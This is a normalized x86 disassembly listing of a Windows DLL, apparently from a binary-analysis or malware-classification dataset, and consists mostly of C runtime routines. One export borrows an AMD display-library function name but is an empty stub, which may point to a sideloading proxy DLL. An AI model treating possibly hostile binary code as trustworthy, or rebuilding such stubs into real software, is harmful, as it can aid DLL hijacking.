call sub_10024fe9
int3
sub_1002f11b
call sub_10044649
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10007acd
sub_1002f53d
xor eax eax
inc eax
retn
sub_10031581
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10035d06
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10032250
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_10032a2f
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10070f60
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10034165
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10054d00
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10035050
push 0x2
call sub_1003ca39
sub_10035129
mov al [ ecx + 0xc ]
retn
sub_1003512d
push 0x8
call sub_10058c10
pop ecx
retn
sub_100353d0
mov [ ecx ] r--data
retn
sub_10035965
push 0x1
push 0x0
push 0x0
call sub_1007f14d
add esp 0xc
retn
sub_10035d00
mov eax r-xdata
retn
sub_10036f00
push ebp
mov ebp esp
push ecx
mov ecx [ rw-data ]
add ecx 0x1c
push esi
mov [ ebp - 0x4 ] 0x0
call sub_1002c710
mov eax esi
mov esp ebp
pop ebp
retn
sub_10036f20
call sub_10044649
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10007acd
sub_10037d50
mov ecx [ eax + 0x4 ]
push ecx
call sub_100187af
pop ecx
retn
sub_10038840
add ecx 0x4
jmp sub_10001d33
sub_100388b6
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10035873
sub_100388d0
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
call sub_100187af
pop ecx
sub_10038b2c
call sub_100448ac
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10035d06
pop ecx
retn
call sub_1002306f
sub_10038b8c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_10036f20
sub_10039441
push 0x0
call sub_10017735
pop ecx
retn
sub_100395f8
mov eax 0x1
retn
sub_1003bfca
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100350a1
pop ecx
pop ecx
pop ebp
retn
sub_1003c0d3
call sub_10062fec
retn
ADL2_Display_ColorTemperatureSource_Get
push 0x0
call [ GetModuleHandleW@IAT ]
xor eax eax
retn
sub_1003c20a
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_1003c519
push esi
push esi
call sub_10024fe9
int3
sub_1003ca39
mov edi edi
push ebp
mov ebp esp
call sub_1001f6d0
push [ ebp + 0x8 ]
call sub_100134bc
pop ecx
push 0xff
call sub_10059e7b
int3
sub_1003dc90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003ddf5
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_10035d06
pop ecx
sub_1003df01
push ebx
call sub_1005b23c
pop ecx
retn
sub_1003eb90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_1005c9e0
add esp 0x8
pop ebp
retn 0x4
sub_1003f4e0
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
push 0x0
mov [ eax ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1003f6b5
mov ecx [ ebp - 0x18 ]
call sub_100649b6
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
int3
sub_1003f7f7
call [ TlsAlloc@IAT ]
retn 0x4
sub_10040737
push 0xa
call sub_1001821c
pop ecx
retn
sub_10041219
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10046d02
add esp 0x10
pop ebp
retn
sub_100419f5
push 0x0
push 0x1
call sub_1003c519
retn
sub_10041a00
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_10041a2b
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10035d06
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10041a6d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10044890
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100448ac
push 0x1
call sub_10083787
pop ecx
retn
sub_10044a0b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10044a29
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004813d
add esp 0x14
pop ebp
retn
sub_1004550a
push 0xe
call sub_1001821c
pop ecx
retn
sub_10045ac1
push ebx
call sub_1005b23c
pop ecx
retn
sub_10046130
xor al al
retn
sub_1004642f
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
jmp sub_10013ab8
sub_10046750
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_10046eff
xor eax eax
retn 0x8
sub_10046f04
mov eax rw-data
retn
sub_100474cb
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10054d00
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004838b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10048a69
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1004879e
sub_10048ac0
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10034c90
push [ esi + 0xc ]
call sub_10034c90
pop ecx
pop ecx
pop esi
retn
sub_10048b80
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x18 ]
call sub_10048210
pop edi
pop ebp
retn
sub_100496f9
mov eax [ ebp - 0x14 ]
push eax
call sub_100187af
add esp 0x4
push 0x0
push 0x0
call sub_10024fe9
int3
sub_10049c9d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001ac6
add esp 0x10
pop ebp
retn
sub_1004a0f0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1004a360
push esi
jmp [ edx * 4 + sub_1004a464 ]
sub_1004a464
push 0x8f1004a3
mov [ 0xffffffffa38f1004 ] eax
add al 0x10
push ebp
movsb [ edi ] [ esi ]
add al 0x10
scasb [ edi ]
mov [ 0xffffffffa3c11004 ] eax
add al 0x10
int3
sub_1004abc0
mov eax rw-data
retn
sub_1004c670
mov eax 0xffff
retn 0x4
sub_1004caf9
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1004cfe6
push 0x8
push r--data
call sub_1007fb20
call sub_10044649
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1006b85f
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1004d006
xor eax eax
inc eax
retn
sub_1004d6a0
mov eax [ rw-data ]
xor ecx ecx
mov [ eax + 0xe8 ] ecx
mov [ eax + 0xf0 ] ecx
mov [ eax + 0xec ] 0x1
retn
sub_1004d839
push 0xc
call sub_1001821c
pop ecx
retn
sub_1004d845
push 0xc
call sub_1001821c
pop ecx
retn
sub_1004d876
and [ esi + 0x70 ] 0xffffffef
retn
sub_1004d923
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_10024fe9
int3
call sub_10067e70
sub_1004deb0
push ebp
mov ebp esp
pop ebp
jmp sub_1000b33e
sub_1004e40f
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1004e571
mov eax 0x1
retn
sub_10050672
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10052a7b
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10050c00
xor eax eax
retn 0x8
sub_100517cd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100458a0
pop ecx
pop ecx
pop ebp
retn
sub_10051ce6
push [ ebp - 0x14 ]
call sub_100383f3
pop ecx
retn
sub_10051d2a
call sub_10044649
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_10044649
dec [ eax + 0x90 ]
sub_10051fa0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_10035d06
add esp 0x4
sub_1005287d
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_10052e10
push ebx
call sub_1005b23c
pop ecx
retn
sub_10052fc0
or eax 0xffffffff
retn
sub_10053073
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_10024fe9
int3
push eax
call sub_100187af
add esp 0x4
sub_10053993
mov al [ ecx + 0xd ]
retn
sub_10053bf8
mov ecx [ ebp - 0x28 ]
call sub_1006dfc0
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
int3
sub_10053d80
mov [ ecx ] r--data
jmp sub_10071ca2
sub_10054030
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10034190
pop ebp
retn
sub_1005446c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_100550f1
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10052a7b
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100554b0
mov edi edi
push esi
call sub_10062fa9
mov esi [ eax + 0x4 ]
call sub_10008a22
mov edx eax
mov eax esi
pop esi
retn
sub_10055689
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100560ca
push 0xd
call sub_1001821c
pop ecx
retn
sub_100560d6
push 0xc
call sub_1001821c
pop ecx
retn
sub_10056a60
mov eax 0x1
retn
sub_100576d9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100576f6
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100577ef
mov eax rw-data
retn
sub_1005789e
mov ax [ ecx + 0xe ]
retn
sub_1005803a
push ebx
call sub_1005b23c
pop ecx
retn
sub_10059036
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10052a7b
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10059052
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_100592b3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1003c09d
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_1005943c
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10059ba6
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10059baf
mov esp [ ebp - 0x18 ]
call sub_1004cfe6
sub_10059d50
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10035780
pop ebx
pop ebp
retn
sub_10059db0
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_10059dc0
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_10059e72
push 0xd
call sub_1001821c
pop ecx
retn
sub_10059e7b
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1007f14d
add esp 0xc
pop ebp
retn
sub_10059fb9
mov ecx [ ebp - 0x14 ]
call sub_10048ac0
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
int3
sub_10059fd0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
pop ebp
jmp sub_10029ba0
sub_1005ab4b
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_10024fe9
int3
mov ecx esi
call sub_1002cb30
push esi
call sub_100187af
add esp 0x4
sub_1005af50
push ebp
mov ebp esp
pop ebp
jmp sub_10035d06
sub_1005b90d
call sub_10044649
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_1005b960
mov al 0x1
retn
sub_1005bc10
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_1005e29f
add esp 0x8
pop ebp
retn 0x4
sub_1005be50
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_10039441
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_1005bef0
mov eax [ ecx + 0x10 ]
push edi
push r--data
xor edi edi
call sub_1001a2f0
neg eax
sbb eax eax
neg eax
pop edi
retn
sub_1005c022
mov ecx [ ebp - 0x1c ]
call sub_100649b6
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
int3
sub_1005c3ca
mov eax [ ecx + 0x8 ]
retn
sub_1005c920
mov eax [ ecx + 0x4 ]
retn
sub_1005d200
mov eax 0x1
retn 0x4
sub_1005da17
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1005da26
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10018202
add esp 0xc
pop ebp
retn
sub_1005e3ac
mov [ ecx ] r--data
jmp sub_10071ca2
sub_1005e560
push ecx
push esi
call sub_1004db10
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop ecx
retn
sub_1005fead
retn 0x4
sub_100605d0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1002c5fc
sub_10060c70
push 0x0
call [ ExitProcess@IAT ]
int3
sub_10060d39
xor eax eax
retn 0x10
sub_10060ed0
push esi
mov esi ecx
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x90 ] 0x0
sub_1006118e
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10007470
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10061b60
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1005c9e0
pop ecx
pop ecx
pop ebp
retn 0x4
sub_10061c20
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
sub_10062b25
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_100134bc
push 0x1
push 0x0
call sub_10051df0
add esp 0xc
jmp sub_1006b85f
call eax
sub_10062b50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x3e ]
mov edx [ ebp + 0xc ]
cmp [ edx + 0x3e ] cl
sbb eax eax
neg eax
pop ebp
retn
sub_10062b90
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10062d40
mov eax 0xffff
retn
sub_10062d82
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_10062fa9
call sub_10044649
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10007acd
sub_10062fcf
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10051d44
add esp 0x14
pop ebp
retn
sub_10062fec
push 0x8
call sub_1001821c
pop ecx
retn
sub_10064630
retn 0x4
sub_100648f2
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_100454a3
pop ecx
retn
sub_100649b6
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10034c90
push [ esi + 0x10 ]
call sub_10034c90
push [ esi + 0x14 ]
call sub_10034c90
add esp 0xc
pop esi
retn
sub_10065a58
mov eax 0x1
retn
sub_10065c90
xor eax eax
xor edx edx
retn
sub_10065ca0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_10065cb0
mov eax 0x80004001
retn 0x8
sub_10065e60
mov ax [ ecx + 0xe ]
retn
sub_10066a1a
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_100123f9
pop ecx
mov [ rw-data ] 0x1
sub_10066f2d
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10067ca0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
pop ebp
retn
sub_10067e70
push esi
push 0x0
mov [ esi ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_10067e89
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005d5ee
add esp 0xc
pop ebp
retn
sub_10067f04
or eax 0xffffffff
retn 0x8
sub_10067f10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
call sub_1005ba70
pop edi
pop ebx
pop ebp
retn
sub_10067fb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10068260
xor eax eax
retn
sub_10068aef
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10035d06
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10068c29
mov eax sub_10020299
mov [ rw-data ] eax
mov [ rw-data ] sub_100517cd
mov [ rw-data ] sub_10001aac
mov [ rw-data ] sub_1002310b
mov [ rw-data ] sub_10040901
mov [ rw-data ] eax
mov [ rw-data ] sub_10012e73
mov [ rw-data ] sub_10041c99
mov [ rw-data ] sub_100458a0
mov [ rw-data ] sub_10061e1c
retn
sub_10069735
mov ecx [ ebp - 0x14 ]
call sub_10061dab
push 0x0
push 0x0
call sub_10024fe9
int3
sub_10069747
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_100102df
pop ecx
sub_100698e6
mov ecx [ ebp - 0x14 ]
call sub_10048ac0
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
int3
sub_10069aed
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10069516
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
j_sub_1002b580
jmp sub_1002b580
sub_1006a438
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1006a560
mov eax [ ecx + 0x10 ]
retn
sub_1006a910
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
retn
sub_1006cc9d
xor eax eax
inc eax
retn
sub_1006cca1
mov esp [ ebp - 0x18 ]
call sub_1004cfe6
sub_1006dfb0
mov eax ecx
retn 0xc
sub_1006e74a
mov ax [ ecx + 0xc ]
retn
sub_1006e90e
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1006eeb0
mov eax esi
call sub_1001f5f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_100700e5
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10054d00
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1007049c
mov edx [ ebp - 0x14 ]
push edx
call sub_100187af
add esp 0x4
push 0x0
push 0x0
call sub_10024fe9
int3
sub_10070d4d
mov edi edi
push ebp
mov ebp esp
call sub_10068c29
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_10067edc
sub_10070ef0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_100187af
add esp 0x4
sub_10070f40
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn 0x10
sub_10070ff0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_100710f9
mov eax 0x1
retn
sub_100712e2
mov ecx [ ebp - 0x14 ]
call sub_10048ac0
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
int3
sub_10071ca2
mov [ ecx ] r--data
jmp sub_1003ddf5
sub_10071f10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10072860
push 0x0
call sub_10028774
int3
sub_100732e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_1000b33e
add esp 0x4
pop ebp
retn
sub_10073300
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_10035d06
add esp 0x4
pop ebp
retn
sub_10079f30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] 0x0
mov ecx 0x20
call sub_10079880
pop ebx
pop ebp
retn
sub_1007a080
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] 0x2
mov ecx 0x20
call sub_10079880
pop ebx
pop ebp
retn
sub_1007f0a7
push 0xc
push r--data
call sub_1007fb20
call sub_10044649
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_100279dc
sub_1007f0dc
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_10059e7b
int3
sub_1007f278
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1001821c
pop ecx
sub_1007f4e0
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10022d44
pop ecx
pop ecx
retn
sub_1007fb65
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100816b3
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_1002ca08
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_100819d9
push 0x4
mov eax sub_10085116
call sub_10013486
call sub_10044649
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10016e69
call sub_1002f519
sub_10081ab2
mov eax [ ebp - 0x14 ]
call sub_1008191e
retn
sub_10082336
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10082260
add esp 0xc
pop ebp
retn 0x4
sub_10082369
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10083765
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1008239b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10082260
add esp 0xc
pop ebp
retn 0x8
sub_10083006
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10080470
sub_10083739
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10083670
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10083784
call eax
retn
sub_10083829
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1005507b
pop ecx
pop ecx
retn
sub_10083858
push 0x1
call sub_1001821c
pop ecx
retn
sub_10083d21
push r-xdata
call sub_100592b3
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10084b49
push 0x7
call sub_1001821c
pop ecx
retn
sub_10084ca0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_10084cc0
lea ecx [ ebp - 0x2c ]
jmp sub_1004c8c0
sub_10084cc8
lea ecx [ ebp - 0x48 ]
jmp sub_1004c8c0
sub_10084cd0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10001e8b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10001e8b
mov eax r--data
jmp sub_10042443
sub_10084d00
lea ecx [ ebp - 0x54 ]
jmp sub_1004c8c0
sub_10084d08
lea ecx [ ebp - 0x70 ]
jmp sub_1004c8c0
sub_10084d10
lea ecx [ ebp - 0x8c ]
